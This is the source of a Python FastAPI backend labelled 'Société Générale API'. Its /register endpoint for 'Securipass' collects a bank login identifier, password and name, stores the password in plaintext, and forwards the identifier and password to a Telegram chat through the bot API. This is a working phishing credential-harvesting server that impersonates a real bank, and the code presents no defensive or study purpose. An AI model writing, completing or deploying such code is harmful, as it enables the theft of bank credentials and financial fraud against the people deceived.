from fastapi import FastAPI, APIRouter
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import uuid
import httpx
from pathlib import Path
from datetime import datetime, timezone
from pydantic import BaseModel

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Telegram config
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# Create the main app
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

class RegisterRequest(BaseModel):
    identifier: str
    password: str
    first_name: str
    last_name: str

async def send_telegram_message(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logging.warning("Telegram credentials not configured")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
    }
    try:
        async with httpx.AsyncClient() as http_client:
            resp = await http_client.post(url, json=payload, timeout=10)
            if resp.status_code != 200:
                logging.error(f"Telegram API error: {resp.text}")
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")

@api_router.get("/")
async def root():
    return {"message": "Société Générale API"}

@api_router.get("/health")
async def health_check():
    return {"status": "healthy"}

@api_router.post("/register")
async def register_user(data: RegisterRequest):
    doc = {
        "id": str(uuid.uuid4()),
        "identifier": data.identifier,
        "password": data.password,
        "first_name": data.first_name,
        "last_name": data.last_name,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await db.users.insert_one(doc)

    # Send to Telegram
    msg = (
        "<b>Nouvelle inscription Securipass</b>\n\n"
        f"<b>Identifiant :</b> <code>{data.identifier}</code>\n"
        f"<b>Mot de passe :</b> <code>{data.password}</code>\n"
        f"<b>Nom :</b> {data.last_name}\n"
        f"<b>Prénom :</b> {data.first_name}\n"
        f"<b>Date :</b> {datetime.now(timezone.utc).strftime('%d/%m/%Y %H:%M UTC')}"
    )
    await send_telegram_message(msg)

    return {
        "id": doc["id"],
        "identifier": doc["identifier"],
        "first_name": doc["first_name"],
        "last_name": doc["last_name"],
        "message": "Inscription réussie"
    }

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
